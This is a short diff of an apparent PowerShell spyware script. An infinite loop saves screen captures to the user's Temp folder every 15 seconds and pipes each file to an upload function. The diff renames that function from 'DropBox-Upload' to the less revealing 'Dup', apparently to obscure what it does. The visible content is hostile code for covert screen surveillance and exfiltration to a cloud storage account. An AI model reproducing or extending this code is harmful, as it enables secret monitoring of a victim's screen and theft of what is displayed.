@@ -1,4 +1,4 @@
-function DropBox-Upload {
+function Dup {
 
 [CmdletBinding()]
 param (
@@ -41,5 +41,5 @@ while(1){
   $bmp.Dispose()
   
   start-sleep -Seconds 15
- "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | DropBox-Upload
+ "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | Dup
 }
